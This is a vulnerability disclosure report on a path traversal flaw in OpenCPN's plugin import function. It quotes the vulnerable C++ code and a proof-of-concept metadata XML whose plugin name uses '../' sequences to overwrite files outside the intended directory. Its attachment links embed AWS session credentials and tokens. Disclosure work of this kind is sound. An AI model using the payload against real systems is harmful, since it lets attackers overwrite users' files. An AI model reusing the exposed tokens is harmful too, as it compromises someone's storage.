---
notion_url: https://www.notion.so/325be0809830834c8c6381516f4b588c
last_synced: 2026-06-12 18:07
tags: [notion-sync]
---

# File overwrite - Path traversal report

- 📄 [[KOR OpenCPN File overwrite - Path traversal report/KOR OpenCPN File overwrite - Path traversal report|KOR OpenCPN File overwrite - Path traversal report]]

Vulnerability Title : OpenCPN File overwrite - Path traversal report
Vulnerability Summary: File overwrite due to creation of a `.meta` file without path validation
Vendor : Github OpenSource Project
Software Name : OpenCPN
Version : 5.11.3
Software Type : ECS (Electronic Chart System)
Attack Type : Path Traversal
Impact : File overwrite with process privileges
Vulnerable Source File: `Console.cpp
`
Vulnerable Function: `import_plugin()`
Vulnerable Parameter : 

```c++
metadata_path = PluginHandler::ImportedMetadataPath([metadata.name](http://metadata.name/));
```

Affected Environment: Ubuntu 24.04

Proof Of Concept  : 

While analyzing `console.cpp` inside `opencpn/cli`, in `import_plugin()`:

```c++
void import_plugin(const std::string& tarball_path) {
    auto handler = PluginHandler::GetInstance();
    PluginMetadata metadata;
    bool ok = handler->ExtractMetadata(tarball_path, metadata);
    if (!ok) {
      std::cerr << "Cannot extract metadata (malformed tarball?)\n";
      exit(2);
    }
    if (!PluginHandler::IsCompatible(metadata)) {
      std::cerr << "Incompatible plugin detected\n";
      exit(2);
    }
    ok = handler->InstallPlugin(metadata, tarball_path);
    if (!ok) {
      std::cerr << "Error extracting import plugin tarball.\n";
      exit(2);
    }
    metadata.is_imported = true;
    auto metadata_path = PluginHandler::ImportedMetadataPath(metadata.name);
    std::ofstream file(metadata_path);
    file << metadata.to_string();
    if (!file.good()) {
      std::cerr << "Error saving metadata file: " << metadata_path
                << " for imported plugin: " << metadata.name;
      exit(2);
    }
    exit(0);
  }
```


After confirming that there is no validation of the `metadata.name` path, an XML file was created for testing:

```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <plugin version="1">
      <name>../../../hijack</name>
      <version>0.0.1</version>
      <release>0</release>
      <summary>PoC</summary>
      <description>Path Traversal PoC</description>
      <target>ubuntu-x86_64</target>
      <build-target>ubuntu</build-target>
      <build-gtk>gtk3</build-gtk>
      <target-version>24.04</target-version>
      <target-arch>x86_64</target-arch>
      <api-version>1.18</api-version>
      <tarball-url>file:///nope</tarball-url>
    </plugin>
```


Inserted `..` and `/` into `<name>` to attempt path traversal:

![image](_assets/image.png)


Additional Materials (video, report attachments):

> 📎 첨부(미변환): [POC.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/b5ba704b-1446-488f-8f07-e5a8cd12e7aa/POC.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466VEY43YA6%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T090659Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEgaCXVzLXdlc3QtMiJHMEUCIQDiUd6SA6uNtmSa9lAmiWZ%2B%2Bdi74DZB5wwxsmlIJmuIowIgBolI19XoFiTbDS2n%2FaqOkHrcfusjEKSisZ3F4QUCXIoq%2FwMIERAAGgw2Mzc0MjMxODM4MDUiDHOfyuit3IhGNA1jlSrcAyjcvAO%2B0gzrqcgOGNpFgTQTBCvZ1D3K1iV8V6VN1SUFBJdNRkKIQ63RxHMpv6S9pkqNKq9YfJx7gi77fGbgi9TIOzrjOWH99hLYLEQa5CEM8CXGUDqmSTdk0lBHYltASI0%2BaNvNbmP7G0gz%2Fql0Jh9sROBAC2iez%2BAL2QT7JigtH1Duxr%2BPcIaTfczGScuONORyI0E4iLy1IY3tHcee7ZCAMNw5O7Ql%2BW8tegsgS99I6m8A9AWy%2BlDisyxcGgT08cCpjMSHhJ4%2BLXjajN4%2BqyR7YZNX%2FO8gV3ikVVeWAc81DZpPXWM71slqI4iaMcY2S6ftbwebiG%2BcdOx83F%2BdKeQvVb73FrZolNiZXlp9dZYl0eceBvZTzXw9%2FyaWca7hGK3SHWuSH8sRyaJmWnMOSfaeShKLvRyXVSCkynhqm0%2F34eW6VmAnDYTQtMCPYtyEa1lEuxXfdh%2BuYq%2BIKQsmvxiGs51FrRx706EoXF4N2fMG0T9YJmnx9lx13QvHIb1e6XXXIJYahwUY8WQQPV5G4WSLiCqLdRYKCgbv42WGG3KZCxyYD8R%2FCYAUG8u30DYJ31uPx3vSOMhTJh4%2Bsl9WCIcgDum%2BkPQ6U%2FWu1kuh4qY11gRjyW5YG0SEkB5UMK7zrtEGOqUBgfG%2FqFrgOfy5Yh7j%2B%2B3RkGb5Q4PI2mw1uakJtAsCFBmgZmhrxUCL8rIXqv6S8AQS0uCDOBZX9IT8rUdqt2ftoWd9HOCDh4%2FSjTFEjQAFlovJ2nEAkDEg3k%2BKTk3KGFWQNGZh%2Fnk0mFHB%2BfViPMpdnbL4G2d3GtBqtXz9YK9qti0NoSDeuR29h7neKEqSDAe1yWTJ6wzMlxJZ4Dm%2F1bYn7ZrkOUZl&X-Amz-Signature=cc7b29e4de0976908ff3591ba14fe6780a74abb5b9c35f9614ae34f47099ede2&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)



> 📎 첨부(미변환): [zdi report1.txt](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/906fde38-249e-4345-a05b-12f9884900fa/zdi_report1.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466VEY43YA6%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T090659Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEgaCXVzLXdlc3QtMiJHMEUCIQDiUd6SA6uNtmSa9lAmiWZ%2B%2Bdi74DZB5wwxsmlIJmuIowIgBolI19XoFiTbDS2n%2FaqOkHrcfusjEKSisZ3F4QUCXIoq%2FwMIERAAGgw2Mzc0MjMxODM4MDUiDHOfyuit3IhGNA1jlSrcAyjcvAO%2B0gzrqcgOGNpFgTQTBCvZ1D3K1iV8V6VN1SUFBJdNRkKIQ63RxHMpv6S9pkqNKq9YfJx7gi77fGbgi9TIOzrjOWH99hLYLEQa5CEM8CXGUDqmSTdk0lBHYltASI0%2BaNvNbmP7G0gz%2Fql0Jh9sROBAC2iez%2BAL2QT7JigtH1Duxr%2BPcIaTfczGScuONORyI0E4iLy1IY3tHcee7ZCAMNw5O7Ql%2BW8tegsgS99I6m8A9AWy%2BlDisyxcGgT08cCpjMSHhJ4%2BLXjajN4%2BqyR7YZNX%2FO8gV3ikVVeWAc81DZpPXWM71slqI4iaMcY2S6ftbwebiG%2BcdOx83F%2BdKeQvVb73FrZolNiZXlp9dZYl0eceBvZTzXw9%2FyaWca7hGK3SHWuSH8sRyaJmWnMOSfaeShKLvRyXVSCkynhqm0%2F34eW6VmAnDYTQtMCPYtyEa1lEuxXfdh%2BuYq%2BIKQsmvxiGs51FrRx706EoXF4N2fMG0T9YJmnx9lx13QvHIb1e6XXXIJYahwUY8WQQPV5G4WSLiCqLdRYKCgbv42WGG3KZCxyYD8R%2FCYAUG8u30DYJ31uPx3vSOMhTJh4%2Bsl9WCIcgDum%2BkPQ6U%2FWu1kuh4qY11gRjyW5YG0SEkB5UMK7zrtEGOqUBgfG%2FqFrgOfy5Yh7j%2B%2B3RkGb5Q4PI2mw1uakJtAsCFBmgZmhrxUCL8rIXqv6S8AQS0uCDOBZX9IT8rUdqt2ftoWd9HOCDh4%2FSjTFEjQAFlovJ2nEAkDEg3k%2BKTk3KGFWQNGZh%2Fnk0mFHB%2BfViPMpdnbL4G2d3GtBqtXz9YK9qti0NoSDeuR29h7neKEqSDAe1yWTJ6wzMlxJZ4Dm%2F1bYn7ZrkOUZl&X-Amz-Signature=8ef290d55aecef55838adc33cffa0eace76a3bd1c15f5d729853257fcea49253&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
